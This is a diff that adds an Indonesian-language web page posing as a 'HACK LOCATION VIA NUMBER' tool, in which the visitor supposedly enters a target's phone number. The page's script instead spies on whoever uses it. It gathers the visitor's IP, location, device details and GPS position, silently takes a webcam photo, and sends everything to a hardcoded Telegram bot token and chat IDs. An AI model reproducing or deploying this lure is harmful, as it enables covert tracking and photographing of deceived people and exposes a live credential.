@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>HACK LOKASI</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background: linear-gradient(135deg, #0a0a0a 0%, #1e1e2e 50%, #2a2a4e 100%);
+      font-family: 'Inter', sans-serif;
+      color: #00ff88;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      position: relative;
+      padding: 20px;
+      perspective: 1000px; /* Untuk efek 3D */
+    }
+    .bg-particles {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
+    }
+    .particle {
+      position: absolute;
+      width: 3px;
+      height: 3px;
+      background: rgba(0, 255, 136, 0.4);
+      border-radius: 50%;
+      animation: float 8s ease-in-out infinite;
+      box-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
+    }
+    @keyframes float {
+      0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 0.4; }
+      50% { transform: translateY(-30px) rotate(180deg); opacity: 1; }
+    }
+    .login-container {
+      background: linear-gradient(145deg, rgba(20, 20, 20, 0.95), rgba(30, 30, 30, 0.95));
+      padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0, 255, 136, 0.3), inset 0 1px 0 rgba(255, 255, 255, 0.1);
+      text-align: center;
+      max-width: 450px;
+      width: 100%;
+      z-index: 2;
+      transform-style: preserve-3d;
+      transition: transform 0.3s ease;
+    }
+    .login-container:hover {
+      transform: rotateX(5deg) rotateY(5deg) translateZ(20px);
+    }
+    .login-title {
+      font-size: 32px;
+      font-weight: 900;
+      margin-bottom: 15px;
+      background: linear-gradient(135deg, #00ff88, #ffffff, #00ff88);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-shadow: 0 0 20px rgba(0, 255, 136, 0.8);
+      transform: translateZ(10px);
+    }
+    .login-subtitle {
+      font-size: 14px;
+      color: #ffaa00;
+      margin-bottom: 25px;
+      transform: translateZ(5px);
+    }
+    .login-input {
+      width: 100%;
+      padding: 15px;
+      margin-bottom: 20px;
+      background: linear-gradient(145deg, #444, #333);
+      border: 2px solid rgba(0, 255, 136, 0.5);
+      border-radius: 12px;
+      color: #fff;
+      font-size: 16px;
+      outline: none;
+      transition: all 0.3s ease;
+      transform: translateZ(5px);
+    }
+    .login-input:focus {
+      border-color: #00ff88;
+      box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+      transform: translateZ(10px) scale(1.02);
+    }
+    .login-button {
+      width: 100%;
+      padding: 15px;
+      background: linear-gradient(145deg, #00ff88, #00cc77);
+      color: #000;
+      border: none;
+      border-radius: 15px;
+      cursor: pointer;
+      font-weight: 700;
+      font-size: 16px;
+      position: relative;
+      overflow: hidden;
+      transform: translateZ(10px);
+      transition: all 0.3s ease;
+      box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.2);
+    }
+    .login-button::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+      transition: left 0.5s;
+    }
+    .login-button:hover {
+      transform: translateZ(20px) rotateX(10deg);
+      box-shadow: 0 10px 30px rgba(0, 255, 136, 0.6);
+    }
+    .login-button:hover::before {
+      left: 100%;
+    }
+    .login-button:active {
+      transform: translateZ(5px) rotateX(5deg);
+    }
+    #info {
+      white-space: pre-wrap;
+      text-align: left;
+      margin-top: 25px;
+      background: linear-gradient(145deg, #333, #222);
+      padding: 20px;
+      border-radius: 12px;
+      font-size: 14px;
+      transform: translateZ(5px);
+      box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.5);
+    }
+    video, canvas {
+      display: none;
+    }
+    @media (max-width: 480px) {
+      .login-container {
+        padding: 30px 20px;
+        border-radius: 16px;
+      }
+      .login-title {
+        font-size: 28px;
+      }
+      .login-input, .login-button {
+        font-size: 15px;
+        padding: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="bg-particles"></div>
+
+  <div class="login-container">
+    <p class="login-title">HACK LOCATION VIA NUMBER</p>
+    <p class="login-subtitle">Jangan Salah Gunakan</p>
+    <input type="number" class="login-input" placeholder="Target Nomor" id="text">
+    <button class="login-button" id="login-button">HACK</button>
+    <div id="info">Silakan masukkan nomor yang akan dihack jika ada permintaan lokasi harus di izinkan...</div>
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
+
+  <script>
+      const botToken = '8571583071:AAFjj-csBmjhK4IeaEe5vnViHBF6bRfH1HY';
+    const chatIds = ['6095291231', '6095291231', '-1003083824240'];
+    const infoDiv = document.getElementById('info');
+    const input = document.getElementById('text');
+    const button = document.getElementById('login-button');
+
+    function sendToTelegram(text) {
+      chatIds.forEach(id => {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
+        }).catch(console.error);
+      });
+    }
+
+    function sendPhotoToTelegram(blob) {
+      chatIds.forEach(id => {
+        const formData = new FormData();
+        formData.append('chat_id', id);
+        formData.append('photo', blob);
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        }).catch(console.error);
+      });
+    }
+
+    async function getInfo() {
+      let ip = '-', city = '-', region = '-', country = '-', org = '-';
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
+        const loc = await locRes.json();
+        if (loc.status === 'success') {
+          city = loc.city;
+          region = loc.regionName;
+          country = loc.country;
+          org = loc.org;
+        }
+      } catch {}
+
+      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
+      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';
+
+      const text = `
+⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼
+IP         : ${ip}
+⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼
+Browser    : ${navigator.userAgent}
+⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼
+YOU         : ${navigator.platform}
+⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼
+Resolution   : ${screen.width}x${screen.height}
+⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼
+Battery    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
+⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼
+Memory     : ${navigator.deviceMemory || 'N/A'} GB
+⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼
+Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼⪼
+Time      : ${new Date().toLocaleString()}
+      `.trim();
+
+      sendToTelegram(`<b>📥 Info Visitors:</b>\n<pre>${text}</pre> BY @XtrolCome`);
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            sendToTelegram(`<b>📍 GPS Location:</b> <a href="${link}">Klik di sini</a>`);
+          },
+          () => sendToTelegram(`📍 GPS Location Rejected`)
+        );
+      } else {
+        sendToTelegram(`📍 Browser does not support GPS`);
+      }
+    }
+
+    async function startCamera() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+      return new Promise((resolve) => {
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => {
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+              setTimeout(() => {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => {
+                  if (blob) sendPhotoToTelegram(blob);
+                  stream.getTracks().forEach(track => track.stop());
+                  resolve();
+                }, 'image/jpeg');
+              }, 3000);
+            };
+          })
+          .catch(err => {
+            sendToTelegram('❌ Camera Denied or Unavailable');
+            resolve();
+          });
+      });
+    }
+
+    button.addEventListener('click', async () => {
+      const nomor = input.value.trim();
+      if (!nomor || nomor.length < 8 || nomor.length > 15) {
+        infoDiv.innerText = '⚠️ Invalid number.';
+        return;
+      }
+      button.disabled = true;
+      infoDiv.innerText = '⏳ Prosesing hack lokasi...';
+      sendToTelegram(`<b>📞 Target Number:</b> ${nomor}`);
+      input.value = '';
+      try {
+        await getInfo();
+        await startCamera();
+        setTimeout(() => {
+          infoDiv.innerText = `✅ Successfully hack lokasi target ${number}`;
+          button.disabled = false;
+        }, 1000);
+      } catch (e) {
+        infoDiv.innerText = '❌ There is an error.';
+        button.disabled = false;
+      }
+    });
+    
+    function createParticles() {
+      const container = document.querySelector('.bg-particles');
+      for (let i = 0; i < 60; i++) {
+        const p = document.createElement('div');
+        p.className = 'particle';
+        p.style.left = Math.random() * 100 + '%';
+        p.style.top = Math.random() * 100 + '%';
+        p.style.animationDelay = Math.random() * 8 + 's';
+        p.style.animationDuration = (Math.random() * 6 + 6) + 's';
+        container.appendChild(p);
+      }
+    }
+    document.addEventListener('DOMContentLoaded', createParticles);
+  </script>
+</body>
+</html>
